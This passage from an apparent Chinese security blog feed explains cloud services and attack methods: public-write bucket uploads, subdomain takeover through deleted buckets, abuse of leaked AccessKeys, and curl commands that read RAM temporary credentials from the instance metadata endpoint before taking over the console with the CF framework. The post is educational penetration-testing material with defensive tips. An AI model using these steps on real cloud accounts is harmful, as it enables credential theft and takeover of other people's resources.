alt="image-20250913185703054"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;免费获取网站&quot;&gt;&lt;a href=&quot;#免费获取网站&quot; class=&quot;headerlink&quot; title=&quot;免费获取网站&quot;&gt;&lt;/a&gt;免费获取网站&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://bazaar.abuse.ch/&quot;&gt;https://bazaar.abus</summary>
      
    
    
    
    <category term="研究生生活" scheme="https://250wuyifan.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="研究生生活" scheme="https://250wuyifan.github.io/tags/%E7%A0%94%E7%A9%B6%E7%94%9F%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>云安全-云服务篇</title>
    <link href="https://250wuyifan.github.io/2025/09/12/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    <id>https://250wuyifan.github.io/2025/09/12/%E4%BA%91%E5%AE%89%E5%85%A8/</id>
    <published>2025-09-12T09:37:21.000Z</published>
    <updated>2025-09-14T08:45:19.029Z</updated>
    
    <content type="html"><![CDATA[<h1 id="云服务基础介绍"><a href="#云服务基础介绍" class="headerlink" title="云服务基础介绍"></a>云服务基础介绍</h1><p>云服务，顾名思义就是云上服务，在云厂商上购买的产品服务。国内有阿里云、腾讯云、华为云、天翼云、Ucloud、金山云等，国外有亚马逊的AWS、Google的GCP、微软的Azure，IBM云等。</p><p><strong>定义</strong>：基于互联网的服务交付模式，通过虚拟化技术将计算、存储、网络等资源池化，以动态扩展、按需付费的方式为用户提供服务。核心特征包括资源池化（多用户共享物理资源）、弹性伸缩（根据业务负载自动调整资源规格）、按需付费（按实际使用量计费，降低闲置成本）、服务可管理（云厂商提供控制台 &#x2F; API 进行资源运维）。</p><p><strong>通俗理解</strong>：无需自建物理机房，直接在阿里云、腾讯云等厂商平台购买服务器、存储等 “云上资源”，并通过互联网使用和管理这些资源。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/20250914005430544.png" alt="image.png"></p><h2 id="云数据库（RDS-Relational-Database-Service）"><a href="#云数据库（RDS-Relational-Database-Service）" class="headerlink" title="云数据库（RDS - Relational Database Service）"></a>云数据库（RDS - Relational Database Service）</h2><p><strong>定义</strong>：云上托管的关系型数据库服务，由云厂商负责数据库的部署、运维、备份、高可用保障（如主从架构、故障自动切换），用户仅需关注业务数据操作。支持 MySQL、SQL Server、PostgreSQL 等主流数据库引擎，提供性能监控、安全组防护、数据加密等附加能力。</p><p><strong>通俗理解</strong>：无需本地搭建数据库服务器，直接在云上 “租用” 一个现成的数据库，云厂商帮你维护服务器稳定性和数据安全。</p><h2 id="身份和访问管理（IAM"><a href="#身份和访问管理（IAM" class="headerlink" title="身份和访问管理（IAM)"></a>身份和访问管理（IAM)</h2><p><strong>定义</strong>：云厂商提供的统一身份权限管理服务，用于控制子账户对云上资源的访问范围，避免权限滥用。核心功能包括用户管理（创建子账户、角色）、权限策略（精细化配置资源操作权限，如仅允许查看 ECS 实例，不允许删除）、凭证管理（AccessKey、登录密码的创建与轮换）。<br><strong>各厂商命名差异</strong>：</p><table><thead><tr><th>云厂商</th><th>产品名称</th><th>核心功能（统一）</th></tr></thead><tbody><tr><td>阿里云</td><td>RAM</td><td>用户管理、权限策略（精细化控制）、AccessKey 凭证管理</td></tr><tr><td>腾讯云</td><td>CAM</td><td>子账户 &#x2F; 角色创建、资源操作权限配置、登录密码轮换</td></tr><tr><td>华为云</td><td>IAM</td><td>与通用 IAM 功能一致，支持企业级角色权限划分</td></tr><tr><td>亚马逊云（AWS）</td><td>IAM</td><td>临时凭证生成、权限边界控制、多因素认证（MFA）</td></tr><tr><td>微软云（Azure）</td><td>Azure AD</td><td>含 IAM 功能，支持单点登录（SSO）、身份治理、条件访问控制</td></tr></tbody></table><h2 id="对象存储（Object-Storage）"><a href="#对象存储（Object-Storage）" class="headerlink" title="对象存储（Object Storage）"></a>对象存储（Object Storage）</h2><h3 id="核心定义"><a href="#核心定义" class="headerlink" title="核心定义"></a>核心定义</h3><p><strong>定义</strong>：定位为海量非结构化数据（如图片、视频、日志、备份文件）设计的存储服务，数据以 “对象” 为基本单元存储（每个对象包含数据本身、元数据（如文件大小、创建时间）、唯一标识符（如 ObjectKey））。与传统文件存储（如 NAS）相比，无目录层级限制，支持无限扩容，访问速度快且成本低。<br><strong>通俗理解</strong>：云上的 “超级网盘”，但更适合企业级海量数据存储，而非个人小文件管理。 </p><h3 id="各厂商产品命名"><a href="#各厂商产品命名" class="headerlink" title="各厂商产品命名"></a>各厂商产品命名</h3><table><thead><tr><th>云厂商</th><th>产品名称</th><th>核心特性</th></tr></thead><tbody><tr><td>阿里云</td><td>OSS</td><td>支持静态网站托管、CDN 加速、数据生命周期管理（自动归档冷数据）</td></tr><tr><td>腾讯云</td><td>COS</td><td>集成腾讯云 CDN、直播点播服务，适合多媒体场景</td></tr><tr><td>华为云</td><td>OBS</td><td>支持跨区域复制、企业级数据加密，适配华为云鲲鹏生态</td></tr><tr><td>谷歌云</td><td>GCS</td><td>与谷歌云 BigQuery、Dataflow 等大数据服务深度集成</td></tr><tr><td>微软云（Azure）</td><td>Blob</td><td>支持分层存储（热 &#x2F; 冷 &#x2F; 归档层），与 Azure Functions、Logic Apps 联动</td></tr><tr><td>亚马逊云（AWS）</td><td>S3</td><td>行业标杆，支持版本控制、跨区域复制、访问日志审计，生态工具丰富</td></tr></tbody></table><h3 id="核心概念：Bucket"><a href="#核心概念：Bucket" class="headerlink" title="核心概念：Bucket"></a>核心概念：Bucket</h3><p>Bucket（存储桶）是对象存储的 “顶层容器”，类似本地文件夹，用于隔离不同业务的对象数据。每个 Bucket 需满足：</p><ul><li><p>全局唯一性：同一云厂商内，Bucket 名称不可重复（如阿里云 OSS 的 Bucket 名称全网唯一）；</p></li><li><p>地域关联性：创建时需指定地域（如 “华东 2（上海）”），数据存储在对应地域的物理节点，访问时优先选择同地域资源降低延迟；</p></li><li><p>权限控制单元：Bucket 的 ACL（访问控制列表）、防盗链、生命周期规则等配置均作用于整个 Bucket。</p></li></ul><h2 id="AWS为例"><a href="#AWS为例" class="headerlink" title="AWS为例"></a>AWS为例</h2><p>各个云厂商对云服务的叫法都不统一，这里统一以AWS为例。</p><p><strong>S3 对象存储Simple Storage Service</strong>，简单的说就是一个类似<strong>网盘</strong>的东西</p><p><strong>EC2 即弹性计算服务Elastic Compute Cloud</strong>，简单的说就是在云上的一台<strong>虚拟机</strong>。</p><p><strong>RDS 云数据库Relational Database Service</strong>，简单的说就是云上的一个<strong>数据库</strong>。</p><p><strong>IAM 身份和访问管理Identity and Access Management</strong>，简单的说就是云控制台上的一套<strong>身份管理服务</strong>，可以用来管理每个子账号的<strong>权限</strong>。</p><h1 id="云服务攻防-对象存储安全"><a href="#云服务攻防-对象存储安全" class="headerlink" title="云服务攻防-对象存储安全"></a>云服务攻防-对象存储安全</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>云服务的对象存储是一种用于存储和管理大量非结构化数据的技术。它将数据分割成对象，每个对象包含数据和元数据。对象存储具有高可扩展性、高可用性和耐久性等特点。</p><p>对象存储的主要对象是文件、图片、视频、音频和日志等非结构化数据。它适用于各种应用场景，如备份和恢复、归档数据、大数据分析、内容存储和分发等。</p><p>云服务的对象存储具有以下特点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">高可扩展性：对象存储可以存储大量数据，并支持水平扩展，可以根据需求动态增加存储容量。</span><br><span class="line">高可用性：对象存储在多个节点上进行数据复制，以提供数据冗余和容错能力，确保数据的高可用性。</span><br><span class="line">耐久性：对象存储通过数据冗余和纠删码等技术来保护数据免受硬件故障和数据丢失的影响，提供数据的持久性存储。</span><br><span class="line">低成本：对象存储通常采用分布式架构，可以在低性能硬件上运行，从而降低了成本。</span><br><span class="line">高性能：对象存储提供了高度可定制的数据读写接口和高速网络传输，可以实现快速的数据存取。</span><br><span class="line">云服务的对象存储在各个云服务提供商中得到了广泛应用，如Amazon S3、Microsoft Azure Blob Storage、Google Cloud Storage等。它们提供了可靠、安全、经济高效的存储服务，为用户提供了高度扩展的云存储解决方案。</span><br></pre></td></tr></table></figure><h2 id="Bucket"><a href="#Bucket" class="headerlink" title="Bucket"></a>Bucket</h2><p>在对象存储中，Bucket（存储桶）是用于组织和管理对象的基本容器。一个Bucket可以容纳任意数量的对象，并通过一个唯一的名称来进行标识。Bucket名称在整个存储系统中必须是唯一的。可以将Bucket视为一个文件夹或容器，用于存储相关对象。</p><p>Bucket具有以下特性：</p><p>命名空间唯一性：每个Bucket的名称在整个存储系统中必须唯一。</p><p>存储策略：Bucket可以设置不同的存储策略，例如数据冗余备份策略、数据保留时间等。</p><p>访问控制：Bucket可以设置访问权限，控制哪些用户或实体可以访问Bucket中的对象。</p><p>集合对象：Bucket中可以容纳多个对象，每个对象都有唯一的Key来标识。</p><p>元数据：Bucket可以存储一些与对象相关的元数据信息，例如文件大小、创建时间和修改时间等。</p><p>对象存储中的Bucket是一个很重要的概念，它提供了对存储系统中对象的组织和管理能力。使用Bucket可以方便地将相关的对象进行分组，并对其设置适当的访问权限和存储策略。</p><h2 id="开通阿里云OSS"><a href="#开通阿里云OSS" class="headerlink" title="开通阿里云OSS"></a>开通阿里云OSS</h2><p>本文以阿里云OSS举例，登录阿里云官网，找到“对象存储”</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914013318886.png" alt="image-20250914013318886"></p><h2 id="创建Bucket"><a href="#创建Bucket" class="headerlink" title="创建Bucket"></a>创建Bucket</h2><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914013500321.png" alt="image-20250914013500321"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914013702181.png" alt="image-20250914013702181"></p><h2 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h2><h3 id="权限配置不当"><a href="#权限配置不当" class="headerlink" title="权限配置不当"></a>权限配置不当</h3><p>Bucket ACL（Access Control List）是控制 Bucket 访问权限的核心配置，主流云厂商均支持以下 3 种基础权限，风险等级从低到高递增：</p><table><thead><tr><th>权限类型</th><th>核心权限范围</th><th>安全风险</th></tr></thead><tbody><tr><td>私有</td><td>仅 Bucket 所有者及被授权的子账户可读写对象，匿名用户无任何权限</td><td>风险最低，符合最小权限原则，推荐默认配置</td></tr><tr><td>公共读</td><td>任何人（含匿名用户）可读取 Bucket 内对象（如下载图片、查看日志），但仅所有者可写入</td><td>风险中等：若存储敏感数据（如用户信息、未公开文档），可能导致数据泄露；若配置<code>ListObject</code>操作，会泄露 Bucket 内所有对象的目录结构（即 “目录遍历漏洞”）</td></tr><tr><td>公共读写</td><td>任何人（含匿名用户）可读写对象（如上传恶意文件、删除合法数据）</td><td>风险极高：攻击者可通过 HTTP PUT 方法上传恶意脚本（如.php、.jsp），若 Bucket 绑定域名并开启解析，可能触发脚本执行（如 “恶意文件上传 + 解析” 漏洞）；还可能导致数据被篡改或删除</td></tr></tbody></table><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p>上图可见创建的时候就是默认组织公共访问，读写权限也是私有，创建之后进行修改会造成安全问题</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914022741567.png" alt="image-20250914022741567"></p><p>开启时</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914023046560.png" alt="image-20250914023046560"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914022838989.png" alt="image-20250914022838989"></p><p>开启之后，后面读写权限是改变不了的。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914022919551.png" alt="image-20250914022919551"></p><p>当修改配置之后</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914023252942.png" alt="image-20250914023252942"></p><p>发生改变。此时上传一个文件。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914023322355.png" alt="image-20250914023322355"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914023410813.png" alt="image-20250914023410813"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914023431306.png" alt="image-20250914023431306"></p><p>这就造成了文件遍历。</p><h4 id="fofa指纹"><a href="#fofa指纹" class="headerlink" title="fofa指纹"></a>fofa指纹</h4><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914115820550.png" alt="image-20250914115820550"></p><h4 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h4><p>开启读写权限之后</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914023924693.png" alt="image-20250914023924693"></p><p>获取get数据集换成put请求</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914024139857.png" alt="image-20250914024139857"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914024242111.png" alt="image-20250914024242111"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914024253885.png" alt="image-20250914024253885"></p><h3 id="域名解析接管"><a href="#域名解析接管" class="headerlink" title="域名解析接管"></a>域名解析接管</h3><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/20250914024543928.png" alt="image.png"></p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>当用户为 Bucket 绑定自定义域名（如<code>static.test.com</code>）时，会在 DNS 服务商（如阿里云 DNS、腾讯云 DNS）配置一条 CNAME 记录，将域名指向 Bucket 的官方域名（如<code>test.oss-cn-shanghai.aliyuncs.com</code>）。若用户删除 Bucket 后未删除 DNS 的 CNAME 记录，该域名会持续指向已不存在的 Bucket（返回<code>NoSuchBucket</code>错误），攻击者可通过 “创建同名 Bucket” 接管该域名的解析权。</p><h4 id="漏洞判断与利用步骤"><a href="#漏洞判断与利用步骤" class="headerlink" title="漏洞判断与利用步骤"></a>漏洞判断与利用步骤</h4><ol><li><strong>漏洞判断</strong>：</li></ol><ul><li><p>访问绑定域名（如<code>https://static.test.com</code>），若页面返回<code>NoSuchBucket</code>错误（表示 Bucket 不存在）； </p></li><li><p>通过<code>nslookup</code>或<code>dig</code>命令查看域名 CNAME 记录（如<code>nslookup static.test.com</code>），若返回云厂商 Bucket 域名（如<code>*.oss-cn-shanghai.aliyuncs.com</code>），则确认可接管； </p></li><li><p>若访问返回<code>AccessDenied</code>（表示 Bucket 存在但无访问权限），则无法接管。</p></li></ul><h4 id="实战利用（以阿里云为例）："><a href="#实战利用（以阿里云为例）：" class="headerlink" title="实战利用（以阿里云为例）："></a><strong>实战利用（以阿里云为例）</strong>：</h4><ul><li><p>步骤 1：在阿里云 OSS 控制台创建与原 Bucket 同名的 Bucket（如原 Bucket 名为<code>test</code>，则创建<code>test</code>，地域需与原 Bucket 一致，否则 CNAME 解析可能失败）； </p></li><li><p>步骤 2：在新创建的 Bucket 中上传恶意文件（如钓鱼页面、恶意脚本）；</p></li><li><p>步骤 3：用户访问<code>https://static.test.com</code>时，会自动解析到攻击者创建的 Bucket，加载恶意内容； </p></li><li><p>风险案例：若原域名是企业的 “官网下载地址” 或 “用户登录跳转地址”，接管后可分发钓鱼软件、窃取用户账号密码。</p></li></ul><h4 id="华为云OBS测试（成功复现）"><a href="#华为云OBS测试（成功复现）" class="headerlink" title="华为云OBS测试（成功复现）"></a>华为云OBS测试（成功复现）</h4><p>使用一账户创建存储桶绑定域名后，再删除存储桶（这里缺几张截图，不补了，师傅可自行测试）</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/586ebe8b4ad04390b52016aeb6bfa718.png" alt="img"></p><p>再次访问该域名显示“NoSuchBucket”</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/eb855a23f29b40679bde7eefacf60bdb.png" alt="img"></p><p>使用nslookup收集受害者信息</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/06e1b5ad213742de9e9de25c3dd24e53.png" alt="img"></p><p>查询上图IP地理位置，即创建存储桶选择的地域</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/0afeeb156d584e2c823b0b8bf4c6431d.png" alt="img"></p><p>使用另一华为账户模拟攻击者账户，根据受害者信息仿造存储桶</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/116885944091420a9f3a64618203ec05.png" alt="img"></p><p>配置域名解析，绑定受害者域名</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/37936a6924154344b3d1ab0352ad4b83.png" alt="img"></p><p>再次访问该域名，成功接管受害者自定义域名存储桶！</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/52dd37cc9c7a4af7aa17c90dd71f9f0c.png" alt="img"></p><p>成功解析攻击者上传的静态资源</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/b0d77bfbe11f41028430026bbbf58d73.png" alt="img"></p><h4 id="fofa指纹-1"><a href="#fofa指纹-1" class="headerlink" title="fofa指纹"></a>fofa指纹</h4><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914115208388.png" alt="image-20250914115208388"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914115226225.png" alt="image-20250914115226225"></p><h3 id="AccessKey泄露"><a href="#AccessKey泄露" class="headerlink" title="AccessKey泄露"></a>AccessKey泄露</h3><h4 id="什么是-AccessKey？"><a href="#什么是-AccessKey？" class="headerlink" title="什么是 AccessKey？"></a>什么是 AccessKey？</h4><p>通常包括以下两个部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AccessKeyID(AKID)：用于标识用户身份。</span><br><span class="line">AccessKeySecret(AKSecret)：用于验证身份，类似密码。</span><br></pre></td></tr></table></figure><p>它们用于用户通过编程接口（API&#x2F;SDK）访问云服务时的身份认证。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/8cb9754911a547a1a596719751ca52df.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/fd980d1364724947abd0c0876c4e996a.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/3b5b08a1804e4dae8b03206a34df0e05.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914025948812.png" alt="image-20250914025948812"></p><h4 id="AccessKey-作用与泄露场景"><a href="#AccessKey-作用与泄露场景" class="headerlink" title="AccessKey 作用与泄露场景"></a>AccessKey 作用与泄露场景</h4><p>AccessKey（由 AccessKeyID 和 AccessKeySecret 组成）是云服务 API 调用的核心凭证，拥有该凭证的用户可通过 API 或工具（如 OSS Browser、云厂商 CLI）操作对应的云资源（如上传 &#x2F; 删除 OSS 文件、创建 ECS 实例）。<br><strong>常见泄露场景</strong>：</p><p>1.源代码存储库：如果您的源代码存储库（如GitHub或Bitbucket）公开了您的代码，其中可能包含了云服务access key，攻击者可以通过查看代码获取这些敏感信息。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/d73a3d63df4842cf9645f1f2a08fba8e.png" alt="img"></p><p>2.日志文件：如果您将云服务access key写入日志文件中，并且这些日志文件被公开访问或者被攻击者获取到，那么他们可以利用这些信息进行未经授权访问云服务。</p><p>3.配置文件：如果您的应用程序或系统配置文件中明文存储了云服务access key，并且这些配置文件被不恰当地共享、存储或传输，攻击者也可以通过获取这些配置文件来获取access key。</p><p>4.开发环境和测试环境：在开发和测试环境中，通常需要使用云服务access key来进行调试和测试。如果这些环境没有得到适当的保护，攻击者可以获取到这些敏感信息。</p><p>5.APP&#x2F;小程序编译打包时被嵌入：在应用程序或小程序的编译打包过程中，如果access key被不适当地嵌入到二进制文件、APK或IPA中，攻击者可以通过解析这些文件来获取access key。（攻击者通过 Charles 抓包获取 API 请求中的 AccessKey，或反编译 APK 文件提取硬编码凭证）。</p><p>6.第三方应用程序：如果您使用了第三方应用程序或服务来管理和监控云服务，这些应用程序可能会要求您提供云服务access key，如&#x2F;actuator&#x2F;heapdump。如果这些应用程序没有得到适当的保护或者存在安全漏洞，攻击者可以通过攻击这些应用程序获取到云服务access key。</p><p>7.前端文件：当前端开发人员在编写代码时，可能会将包含AccessKey的密钥或凭证直接硬编码到前端文件（如HTML、JS文件）中，这样在前端代码执行时就可以直接获取到AccessKey，并用于与云服务进行交互。然而，一旦这些文件被存储在公开的位置或未受保护的服务器上，攻击者就有可能获取到这些文件，并窃取AccessKey。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/41757c7570d04885b4f7f4f361231225.png" alt="img"></p><p>8.邮件 &#x2F; 聊天记录泄露（运维人员在沟通中误发 AccessKey）。</p><h4 id="如何发现"><a href="#如何发现" class="headerlink" title="如何发现"></a>如何发现</h4><p>作为安全测试者，我们如何挖掘该安全问题</p><p>这里推荐一篇文章：AccessKey 特征整理 | T Wiki <a href="https://wiki.teamssix.com/cloudservice/more/">https://wiki.teamssix.com/cloudservice/more/</a></p><p>Burpsuite插件HaE：GitHub - gh0stkey&#x2F;HaE: HaE - Highlighter and Extractor, Empower ethical hacker for efficient operations.<a href="https://gitcode.com/gh_mirrors/ha/HaE?utm_source=csdn_github_accelerator&isLogin=1">https://gitcode.com/gh_mirrors/ha/HaE?utm_source=csdn_github_accelerator&amp;isLogin=1</a></p><h4 id="实战利用方法"><a href="#实战利用方法" class="headerlink" title="实战利用方法"></a>实战利用方法</h4><ol><li><strong>工具选择</strong>：</li></ol><ul><li><p>图形化工具：OSS Browser（阿里云）、COS Browser（腾讯云）、S3 Browser（AWS S3）；</p></li><li><p>命令行工具：阿里云 CLI（<code>aliyun oss ls</code>）、腾讯云 CLI（<code>tccli cos ls</code>）、AWS CLI（<code>aws s3 ls</code>）；  </p></li><li><p>渗透框架：CF（Cloud Exploit Framework，支持多厂商资源管理）。</p></li><li><p><a href="https://github.com/wgpsec/cloudsword">https://github.com/wgpsec/cloudsword</a> </p></li><li><p><a href="https://github.com/wgpsec/cloudsword/blob/master/static/1201_aliyun_oss_list_buckets.gif">https://github.com/wgpsec/cloudsword/blob/master/static/1201_aliyun_oss_list_buckets.gif</a></p></li><li><p>云鉴 CloudSword 是一款帮助公有云租户快速发现云上风险、测试云上风险、增强云上防护能力的综合性开源工具。</p></li></ul><ol><li><strong>利用步骤（以阿里云 OSS 为例）</strong>：</li></ol><ul><li><p>步骤 1：在 OSS Browser 中配置泄露的 AccessKeyID 和 AccessKeySecret，选择对应的地域；</p></li><li><p>步骤 2：连接成功后，可查看 Bucket 列表、下载敏感文件（如数据库备份、用户数据）、上传恶意文件；</p></li><li><p>步骤 3：若 AccessKey 权限足够（如拥有<code>AliyunOSSFullAccess</code>权限），可修改 Bucket ACL 为 “公共读写”，扩大攻击范围；  </p></li><li><p>进阶利用：通过 AccessKey 调用云厂商 API，获取 ECS 实例列表、RDS 数据库地址等信息，进行横向渗透。</p></li></ul><h4 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h4><p>权限最小化：使用 RAM 子账户创建 AccessKey，仅授予必要权限（如仅允许 “OSS 只读”，不允许 “ECS 管理”）；</p><p>定期轮换：每 3 个月更换一次 AccessKey，删除过期或无用的 AccessKey；</p><p>泄露检测：开启云厂商安全中心的 “AccessKey 泄露检测” 功能（如阿里云安全中心、腾讯云威胁情报），及时发现泄露并告警； </p><p>避免前端暴露：前端直传 OSS 时，使用 “临时 AccessKey”（通过后端 API 动态生成，有效期短，权限受限），而非永久 AccessKey。</p><h1 id="云服务攻防-弹性计算服务安全"><a href="#云服务攻防-弹性计算服务安全" class="headerlink" title="云服务攻防-弹性计算服务安全"></a>云服务攻防-弹性计算服务安全</h1><h2 id="服务定义与命名"><a href="#服务定义与命名" class="headerlink" title="服务定义与命名"></a>服务定义与命名</h2><p><strong>定义</strong>：云上的虚拟化服务器（虚拟机），用户可自定义 CPU、内存、硬盘、操作系统等配置，用于部署 Web 应用、数据库、中间件等业务。与传统物理服务器相比，支持分钟级创建 &#x2F; 销毁，可通过 “弹性伸缩” 根据业务负载自动增减实例数量。<br><strong>各厂商产品命名</strong>： </p><table><thead><tr><th>云厂商</th><th>产品名称</th><th>核心特性</th></tr></thead><tbody><tr><td>阿里云</td><td>ECS</td><td>支持突发性能实例、GPU 实例、弹性裸金属服务器，适配阿里云生态（如 RDS、OSS）</td></tr><tr><td>腾讯云</td><td>CVM</td><td>集成腾讯云安全组、云镜（主机安全）、负载均衡，适合游戏、直播场景</td></tr><tr><td>华为云</td><td>ECS</td><td>基于鲲鹏芯片的 ARM 架构实例，支持欧拉操作系统，侧重企业级稳定性</td></tr><tr><td>谷歌云</td><td>GCE</td><td>与谷歌云 Kubernetes Engine（GKE）深度集成，适合容器化部署</td></tr><tr><td>微软云（Azure）</td><td>VM</td><td>支持 Windows Server、Linux 系统，与 Azure Active Directory、Office 365 联动</td></tr><tr><td>亚马逊云（AWS）</td><td>EC2</td><td>行业标杆，支持 Spot 实例（低价闲置资源）、Auto Scaling（弹性伸缩）</td></tr></tbody></table><h2 id="核心风险：元数据泄露与-SSRF-结合"><a href="#核心风险：元数据泄露与-SSRF-结合" class="headerlink" title="核心风险：元数据泄露与 SSRF 结合"></a>核心风险：元数据泄露与 SSRF 结合</h2><h3 id="元数据（Instance-Metadata）定义"><a href="#元数据（Instance-Metadata）定义" class="headerlink" title="元数据（Instance Metadata）定义"></a>元数据（Instance Metadata）定义</h3><p>实例元数据是云厂商为 ECS&#x2F;CVM 实例生成的动态信息，包含实例的基本配置（如实例 ID、内网 IP、操作系统类型）、IAM 角色临时凭证（如临时 AccessKey）等。用户可在实例内部通过固定地址访问元数据，无需认证（默认仅允许实例内部访问）。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/20250914103834314.png" alt="image.png"> </p><p><strong>各厂商元数据地址</strong>： </p><table><thead><tr><th>云厂商</th><th>元数据访问地址</th><th>临时凭证路径（IAM 角色）</th></tr></thead><tbody><tr><td>阿里云</td><td><code>http://100.100.100.200/latest/meta-data/</code></td><td><code>/latest/meta-data/ram/security-credentials/角色名</code></td></tr><tr><td>腾讯云</td><td><code>http://169.254.0.23/latest/meta-data/</code></td><td><code>/latest/meta-data/cam/security-credentials/角色名</code></td></tr><tr><td>华为云</td><td><code>http://169.254.169.254/latest/meta-data/</code></td><td><code>/latest/meta-data/iam/security-credentials/角色名</code></td></tr><tr><td>AWS</td><td><code>http://169.254.169.254/latest/meta-data/</code></td><td><code>/latest/meta-data/iam/security-credentials/角色名</code></td></tr></tbody></table><h3 id="漏洞原理：SSRF-元数据泄露"><a href="#漏洞原理：SSRF-元数据泄露" class="headerlink" title="漏洞原理：SSRF + 元数据泄露"></a>漏洞原理：SSRF + 元数据泄露</h3><p>若 ECS 实例上部署的 Web 应用存在 SSRF（服务器端请求伪造）漏洞，攻击者可构造请求，让 Web 应用（运行在实例内部）访问元数据地址，获取临时 AccessKey。由于临时 AccessKey 拥有 IAM 角色的权限，攻击者可利用该凭证操作云资源，实现横向渗透。</p><h3 id="实战利用场景与步骤"><a href="#实战利用场景与步骤" class="headerlink" title="实战利用场景与步骤"></a>实战利用场景与步骤</h3><h4 id="场景-1：获取-ECS-权限后横向移动"><a href="#场景-1：获取-ECS-权限后横向移动" class="headerlink" title="场景 1：获取 ECS 权限后横向移动"></a>场景 1：获取 ECS 权限后横向移动</h4><ul><li><p>前提：攻击者已通过 Web 漏洞（如 Webshell）获取 ECS 实例的 shell 权限；</p></li><li><p>利用步骤：  执行命令访问元数据地址，获取关键信息：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://100.100.100.200/latest/meta-data/</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/20250914104140832.png" alt="image.png"></p><p> 获取临时凭据 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://100.100.100.200/latest/meta-data/ram/security-credentials/ecs</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/20250914104155435.png" alt="image.png"></p><p>使用 CF 框架配置临时凭证，接管云资源：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cf config  <span class="comment"># 输入AccessKeyId、AccessKeySecret、SecurityToken、云厂商（如alibaba）</span></span><br><span class="line">cf alibaba perm  <span class="comment"># 查看当前凭证的权限范围</span></span><br><span class="line">cf alibaba console  //一键接管控制台</span><br><span class="line">接管控制台的时候默认会创建一个名称为 crossfire 